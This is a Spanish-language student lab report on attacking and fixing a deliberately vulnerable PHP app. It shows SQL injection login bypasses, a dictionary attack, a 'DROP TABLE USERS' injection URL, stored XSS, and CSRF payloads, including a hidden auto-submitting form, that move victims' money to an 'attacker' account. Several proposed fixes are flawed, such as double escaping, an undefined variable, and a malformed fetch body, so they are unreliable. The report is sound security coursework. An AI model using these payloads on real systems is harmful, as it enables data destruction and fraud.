# Proyecto 3: Talent ScoutTech

## Informe técnico

### Parte 1 - SQLi

**a)** Dad un ejemplo de combinación de usuario y contraseña que provoque un error en la consulta SQL generada por este formulario. Apartir del mensaje de error obtenido, decid cuál es la consulta SQL que se ejecuta, cuál de los campos introducidos al formulario utiliza y cuál no.

Escribo los valores : ' OR "1"="1"; -- -

En el campo : User

Del formulario de la página : /auth.php

La consulta SQL que se ejecuta es : SELECT userId, password FROM users WHERE username = "'' OR "1"="1"; -- -"

Campos del formulario web utilizados : User

Campos del formulario web no utilizados : Password


**b)** Gracias a la SQL Injection del apartado anterior, sabemos que este formulario es vulnerable y conocemos el nombre de los campos de la tabla “users”. Para tratar de impersonar a un usuario, nos hemos descargado un diccionario que contiene algunas de las contraseñas más utilizadas (se listan a continuación):

- password
- 123456
- 12345678
- 1234
- qwerty
- 12345678
- dragon

Dad un ataque que, utilizando este diccionario, nos permita impersonar un usuario de esta aplicación y acceder en nombre suyo. Tened en cuenta que no sabéis ni cuántos usuarios hay registrados en la aplicación, ni los nombres de estos.

Usando ZAP, realiza un ataque con diccionario al campo usuario con el siguiente payload :
```' OR 1=1 AND password="{i}"-- -``` y en el campo contraseña ```"{i}"``` siendo la variable i la contraseña a iterar.

Campo de contraseña con el que el ataque ha sido exitoso: 1234.

**c)** Si vais a private/auth.php, veréis que en la función areUserAndPasswordValid, se utiliza “SQLite3::escapeString()”, pero, aun así, el formulario es vulnerable a SQL Injections, explicad cuál es el error de programación de esta función y como lo podéis corregir.

Explicación del error : Únicamente se escapan ciertos caracteres (de los cuales no incluye las dobles comillas) dentro de la cadena. En este caso, toda la consulta SQL se construye concatenando directamente las variables de usuario y contraseña, exponiendolo a una inyección SQL en el campo username.

La solución más idonea es usar la función escapeString solamente introduciendo como parámetro el dato en sí (el usuario) y construyendo por encima la query en un prepareStatement con la función ```prepare()``` de forma que el texto introducido se interpreta como valor del parámetro y no como código SQL puro.

Solución : Cambiar las líneas con el código 
```php
$query = SQLite3::escapeString('SELECT userId, password FROM users WHERE username = "' . $user . '"');

$result = $db->query($query) or die ("Invalid query: " . $query . ". Field user introduced is: " . $user);

$row = $result->fetchArray();
```
por las siguientes líneas

```php
$stmt = $db->prepare('SELECT userId, password FROM users WHERE username = :username');

$stmt->bindValue(':username', SQLite3::escapeString($user), SQLITE3_TEXT);

$result = $stmt->execute();
$row = $result->fetchArray(SQLITE3_ASSOC);
```

**d)** Si habéis tenido éxito con el apartado b), os habéis autenticado utilizando el usuario luis (si no habéis tenido éxito, podéis utilizar la contraseña 1234 para realizar este apartado). Con el objetivo de mejorar la imagen de la jugadora Candela Pacheco, le queremos escribir un buen puñado de comentarios positivos, pero no los queremos hacer todos con la misma cuenta de usuario.

Para hacer esto, en primer lugar habéis hecho un ataque de fuerza bruta sobre eldirectorio del servidor web (por ejemplo, probando nombres de archivo) y habéis encontrado el archivo add\_comment.php~. Estos archivos seguramente se han creado como copia de seguridad al modificar el archivo “.php” original directamente al servidor. En general, los servidores web no interpretan (ejecuten) los archivos .php~ sino que los muestran como archivos de texto sin interpretar.

Esto os permite estudiar el código fuente de add\_comment.php y encontrar una vulnerabilidad para publicar mensajes en nombre de otros usuarios. ¿Cuál es esta vulnerabilidad, y cómo es el ataque que utilizáis para explotarla?

La vulnerabilidad consiste una mala sanitarización de la entrada, la cual permite realizar una inyección SQL a través del parámetro "playerId".

Se podría explotar usando como entrada dicho parámetro de la url. Por ejemplo de la siguiente forma:

```http://localhost:8080/add_comments.php?id=5; DROP TABLE USERS; -- -```

### Parte 2 - XSS

**a)** Para ver si hay un problema de XSS, crearemos un comentario que muestre un alert de Javascript siempre que alguien consulte el/los comentarios de aquel jugador (show_comments.php). Dad un mensaje que genere un «alert»de Javascript al consultar el listado de mensajes.

Introduzco el mensaje : <script>alert("hola")</script>
En el formulario de la página : /add_comment.php

**b)** Por qué dice &amp; cuando miráis un link (como elque aparece a la portada de esta aplicación pidiendo que realices un donativo) con parámetros GETdentro de código html si en realidad el link es sólo con "&" ?

Explicación : Al ser "&" un carácter HTML con un significado especial, ya que introduce entidades de caracteres, para que el navegador interprete un & como un carácter literal y no como el inicio de una entidad debe ser escrito como &amp;.

**c)** Explicad cuál es el problema de show\_comments.php, y cómo lo arreglaríais. Para resolver este apartado, podéis mirar el código fuente de esta página.

¿Cuál es el problema? : No realiza una comprobación o sanitarización del contenido antes de ser mostrado en la página.

Sustituyo las líneas :
```php
# List comments
if (isset($_GET['id']))
{
	$query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId =".$_GET['id']." AND U.userId = C.userId order by C.playerId desc";

	$result = $db->query($query) or die("Invalid query: " . $query );

	while ($row = $result->fetchArray()) {
		echo "<div>
                <h4> ". $row['username'] ."</h4> 
                <p>commented: " . $row['body'] . "</p>
              </div>";
	}

	$playerId = $_GET['id'];
}
```

por el siguiente código

```php
# List comments
if (isset($_GET['id']))
{
	$query = "SELECT commentId, username, body FROM comments C, users U WHERE C.playerId =".$_GET['id']." AND U.userId = C.userId order by C.playerId desc";

	$result = $db->query($query) or die("Invalid query: " . $query );

	while ($row = $result->fetchArray()) {
		echo "<div>
                <h4> ". $row['username'] ."</h4> 
                <p>commented: " . htmlspecialchars($row['body']) . "</p>
              </div>";
	}

	$playerId = $_GET['id'];
}
```

**d)** Descubrid si hay alguna otra página que esté afectada por esta misma vulnerabilidad. En caso positivo, explicad cómo lo habéis descubierto.

Otras páginas afectadas : insert_player.php

¿Como lo he descubierto? : He insertado la inyección XSS en el formulario de inserción de nuevos jugadores, lo ha aceptado la web al enviarlo y al consultar el listado de jugadores ha aparecido el popup de javascript. Esto demuestra que esta página está afectada por una vulnerabilidad de injección XSS almacenada.

### Parte 3 - Control de acceso, autenticación y sesiones de usuarios

**a)** En el ejercicio 1, hemos visto cómo era inseguro el acceso de los usuarios a la aplicación. En la página de register.php tenemos el registro de usuario. ¿Qué medidas debemos implementar para evitar que el registro sea inseguro? Justifica esas medidas e implementa las medidas que sean factibles en este proyecto.

Para securizar el registro se debería de implementar el uso de "Prepared Statements" a través del uso de la función prepare() de la siguiente manera:

```php

$username = SQLite3::escapeString($_POST['username']);
$password = SQLite3::escapeString($_POST['password']);

$query = "INSERT INTO users (username, password) VALUES (:username, :password)";

    $stmt = $db->prepare($query); 
    $stmt->bindValue(':username', $username, SQLITE3_TEXT);
    $stmt->bindValue(':password', $password, SQLITE3_TEXT);

    // Ejecutar la sentencia preparada
    $result = $stmt->execute();
```

El uso de "Prepared statements" permite convertir la entrada de los parámetros en texto plano, de forma que no se ejecutarían sentencias maliciosas introducidas por el atacante.

**b)** En el apartado de login de la aplicación, también deberíamos implantar una serie de medidas para que sea seguro el acceso, (sin contar la del ejercicio 1.c). Como en el ejercicio anterior, justifica esas medidas e implementa las que sean factibles y necesarias (ten en cuenta las acciones realizadas en el register). Puedes mirar en la carpeta private.

Se podría implementar medidas de contención, como un contador de veces que se intenta iniciar sesión con usuario concreto. De esta forma se podría evitar ataques de fuerza bruta. Esto se complementaría con un sistema de avisos a los administradores.

**c)** Volvemos a la página de register.php, vemos que está accesible para cualquier usuario, registrado o sin registrar. Al ser una aplicación en la cual no debería dejar a los usuarios registrarse, qué medidas podríamos tomar para poder gestionarlo e implementa las medidas que sean factibles en este proyecto.

Se podrían usar roles de usuario de forma que solo los usuarios con rol de administrador pueden tener privilegios de acceso al registro de nuevos usuarios.

**d)** Al comienzo de la práctica hemos supuesto que la carpeta private no tenemos acceso, pero realmente al configurar el sistema en nuestro equipo de forma local. ¿Se cumple esta condición? ¿Qué medidas podemos tomar para que esto no suceda?

No tenemos acceso desde el navegador, así que no se cumpliría la condición.

En caso de que se cumpliera, se podría configurar el servidor para que no permitiera ver el contenido.

En apache, se crearía un archivo con el nombre ```.htaccess``` con la siguiente directiva: ```Deny from all```.

**e)** Por último, comprobando el flujo de la sesión del usuario. Analiza si está bien asegurada la sesión del usuario y que no podemos suplantar a ningún usuario. Si no está bien asegurada, qué acciones podríamos realizar e implementarlas.

Para securizar la sesión, se podría implementar el uso de sesiones web desde el lado del servidor para la autenticación. Actualmente se usa un sistema de cookies para almacenar los datos de sesión, lo cual es altamente peligroso ya que son facilmente accesibles si no están bien configuradas.

```php
# auth.php

if (isset($_POST['username']) && isset($_POST['password'])) {
    $user = $_POST['username'];
    $password = $_POST['password'];

    
    if (areUserAndPasswordValid($user, $password)) {
        // Autenticación exitosa
        $login_ok = TRUE;
        $error = "";
        
        $_SESSION['user_id'] = $userId; 
        
        header("Location: list_players.php"); 

        exit; 
    } else {
        // Autenticación fallida
        $login_ok = FALSE;
        $error = "Invalid user or password.";
    }
}

# On logout
if (isset($_POST['Logout'])) {
    // Elimina los datos de la sesión y destruir la sesión
    $_SESSION = array(); 
    session_destroy(); // Destruye la sesión del lado del servidor

    header("Location: index.php");

    exit; 
}

```

Al inicio de cada archivo php al cual se deba acceder con la autenticación de la sesión se añadirá al principio ```session_start()``` seguido de un bloque de código condicional que verifique si dicha sesión está realmente iniciada. Si es falso, significa que el usuario no está logueado, y debes impedir que acceda al contenido (generalmente redirigiendo a la página de login). Si es verdadero, el script puede continuar.

Un ejemplo de esta implementación sería el siguiente
```php
if (!isset($_SESSION['user_id'])) {
  
    header("Location: index.php"); 
    
    exit;

}
```

### Parte 4 - Servidores web

¿Qué medidas de seguridad implementariaís en el servidor web para reducir el riesgo a ataques?

- Sanitarizar todos los formularios, controlando los datos de entrada y protegiendo así de posibles ataques de injección SQL o XSS.

- Proteger ante CSRF implementando tokens en formularios para asegurarse de que las solicitudes provengan de usuarios legítimos y no de scripts maliciosos.

- Utilizar cifrado SSL para cifrar la comunicación entre el cliente y el servidor, protegiendo así los datos sensibles que se muevan en dicha comunicación.

- Implementa un sistema de monitoreo y registro de logs para detectar actividad sospechosa y responder rápidamente a posibles incidentes.

### Parte 5 - CSRF

**a)** Editad un jugador para conseguir que, en el listado de jugadores list\_players.php aparezca, debajo del nombre de su equipo y antes de show/add comments un botón llamado Profile que corresponda a un formulario que envíe a cualquiera que haga clic sobre este botón a esta dirección que hemos preparado.

En el campo : Team name

Introduzco :
```html
DAM
<br><br>
<a href="http://web.pagos/donate.php?amount=100&receiver=attacker">
    <button type="button">Profile</button>
</a>
```

**b)** Una vez lo tenéis terminado, pensáis que la eficacia de este ataque aumentaría si no necesitara que elusuario pulse un botón. Con este objetivo, cread un comentario que sirva vuestros propósitos sin levantar ninguna sospecha entre los usuarios que consulten los comentarios sobre un jugador (show\_comments.php).

```javascript
He has something special
<script>

const opciones = {
      method: 'GET',
      mode: 'no-cors',
    };

await fetch("http://web.pagos/donate.php?amount=100&receiver=attacker", opciones);

</script>
```

**c)** Pero web.pagos sólo gestiona pagos y donaciones entre usuarios registrados, puesto que, evidentemente, le tiene que restar los 100€ a la cuenta de algún usuario para poder añadirlos a nuestra cuenta.

Explicad qué condición se tendrá que cumplir por que se efectúen las donaciones de los usuarios que visualicen el mensaje del apartado anterior o hagan click en el botón del apartado a).

La condición fundamental para que las donaciones se efectúen es que el usuario que visita la página (ya sea haciendo clic en el botón o simplemente visualizando el comentario malicioso) esté autenticado en la plataforma web.pagos con una sesión activa. El usuario atacante también deberá contar con un usuario registrado en la plataforma web.pagos.

Si el usuario no está autenticado, la plataforma no podrá asociar la donación a ninguna cuenta y, por lo tanto, no se efectuará la transferencia. 

La víctima también tendrá que tener el saldo suficiente para realizar la transferencia, si no la web arrojaría probablemente un error.


**d)** Si web.pagos modifica la página donate.php para que reciba los parámetros a través de POST, quedaría blindada contra este tipo de ataques? En caso negativo, preparad un mensaje que realice un ataque equivalente al de la apartado b) enviando los parámetros “amount” i “receiver” por POST.

Hay dos opciones para ejecutar este ataque

- Con un formulario HTML oculto :

Este formulario se ejecuta con valores por defecto de forma automática

```html
<iframe name="hiddenFrame" style="display:none;"></iframe>
<form action="http://web.pagos/donate.php" method="post" target="hiddenFrame" id="donationForm">
  <input type="hidden" name="amount" value="100">
  <input type="hidden" name="receiver" value="attacker">
</form>
<script>
  document.getElementById("donationForm").submit();
</script>
```

- Con una petición HTML en Javascript

Realiza una petición HTML usando Javascript, introduciendo los datos en el "body" de la petición

```javascript
<script>

const data = {
  "amount" : "100",
  "receiver" : "attacker"
}

const opciones = {
      method: 'POST',
      mode: 'cors',
      headers : {
        body: JSON.stringify(data)
      }
    };

await fetch("http://web.pagos/donate.php", opciones);

</script>

```
